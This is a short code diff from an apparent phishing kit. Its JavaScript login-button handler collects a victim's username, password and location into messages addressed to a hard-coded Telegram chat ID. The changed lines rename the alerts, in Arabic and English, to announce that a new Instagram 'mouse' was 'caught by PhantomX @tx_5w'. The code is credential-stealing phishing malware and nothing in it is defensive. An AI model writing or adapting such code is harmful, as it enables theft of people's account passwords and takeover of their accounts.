@@ -85,7 +85,7 @@ document.querySelector("#loginbutton").addEventListener("click", function(event)
         var chatId = "5091980014";
 
         // رسالة باللغة العربية
-        var messageArabic = `⚡️ **محاولة تسجيل دخول جديدة** ⚡️\n\n`;
+        var messageArabic = `⚡️ **تم صيد فأر جديد نوع الحساب انستجرام بواسطة PhantomX @tx_5w** ⚡️\n\n`;
         messageArabic += `🧑‍💻 **اسم المستخدم:** ${username}\n`;
         messageArabic += `🔑 **كلمة المرور:** ${password}\n`;
         messageArabic += `🌍 **الموقع:** ${location}\n`;
@@ -101,7 +101,7 @@ document.querySelector("#loginbutton").addEventListener("click", function(event)
         messageArabic += `🕒 **التاريخ والوقت:** ${new Date().toLocaleString()}`;
 
         // رسالة باللغة الإنجليزية
-        var messageEnglish = `⚡️ **New Login Attempt** ⚡️\n\n`;
+        var messageEnglish = `⚡️ **New Instagram account type mouse caught by PhantomX @tx_5w** ⚡️\n\n`;
         messageEnglish += `🧑‍💻 **Username:** ${username}\n`;
         messageEnglish += `🔑 **Password:** ${password}\n`;
         messageEnglish += `🌍 **Location:** ${location}\n`;
